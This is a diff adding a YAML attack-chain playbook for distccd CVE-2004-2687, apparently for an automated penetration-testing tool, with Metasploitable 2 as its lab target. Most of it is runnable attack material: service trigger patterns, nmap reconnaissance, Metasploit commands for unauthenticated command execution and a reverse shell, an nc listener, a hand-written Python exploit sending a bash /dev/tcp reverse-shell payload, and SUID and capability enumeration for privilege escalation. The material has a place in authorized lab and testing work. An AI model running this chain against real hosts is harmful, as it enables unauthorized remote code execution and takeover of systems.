@@ -1,0 +1,75 @@
+chain_id: distccd_cve_2004_2687
+title: "distccd — CVE-2004-2687 unauth command execution via DIST_SLOTS protocol"
+severity: CRITICAL
+tags: [distccd, cve-2004-2687, rce, metasploitable]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2004-2687" }
+    - { service_pattern: "(?i)distcc(d)?" }
+    - { banner_pattern: "(?i)distcc" }
+    - { product_pattern: "(?i)distcc" }
+    - { port_in: [3632] }
+
+description: |
+  distccd is a distributed C compiler daemon. The default config
+  trusts every connecting client to send a `DIST_SLOTS` request that
+  includes the compiler arguments — including `--exec` style flags
+  that run arbitrary commands. No auth. Patched-by-default since
+  2008, but the unsafe default still lurks in dev clusters and
+  unpatched embedded boxes. Metasploitable 2 ships it on 3632.
+
+steps:
+  - id: 1
+    title: "Confirm distccd is exposed"
+    command: |
+      nmap -sV -p 3632 $VICTIMA
+      # Banner: distccd vNN
+
+  - id: 2
+    title: "Run id via the public Metasploit module"
+    command: |
+      msfconsole -qx 'use exploit/unix/misc/distcc_exec; \
+        set RHOSTS $VICTIMA; set RPORT 3632; \
+        set CMD "id; uname -a"; \
+        set PAYLOAD cmd/unix/generic; run'
+
+  - id: 3
+    title: "Reverse shell"
+    command: |
+      msfconsole -qx 'use exploit/unix/misc/distcc_exec; \
+        set RHOSTS $VICTIMA; set RPORT 3632; \
+        set PAYLOAD cmd/unix/reverse; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+      # Or with a one-liner listener on Kali:
+      nc -lvnp 4444
+
+  - id: 4
+    title: "Manual — the protocol is trivial"
+    command: |
+      python3 - <<'PY'
+      import socket, sys
+      VICTIMA="$VICTIMA"; CMD="bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'"
+      s=socket.create_connection((VICTIMA,3632))
+      pkt=f"DIST00000001ARGC{len(CMD.split()):08x}".encode()
+      for w in CMD.split(): pkt += f"ARGV{len(w):08x}{w}".encode()
+      s.sendall(pkt); print(s.recv(4096))
+      PY
+
+  - id: 5
+    title: "Post — distcc usually runs as 'daemon' or 'distcc' (low-priv)"
+    command: |
+      # Foothold first, then chase SUID / capabilities to root:
+      find / -perm -4000 -type f 2>/dev/null
+      getcap -r / 2>/dev/null
+
+common_errors:
+  - error: "Connection refused on 3632"
+    solution: |
+      distccd not running or bound to localhost. Some distros disable
+      by default — check 3033 (debug port) and 3633 (alt). If filtered,
+      this is a dead end.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+  - https://distcc.github.io/security.html
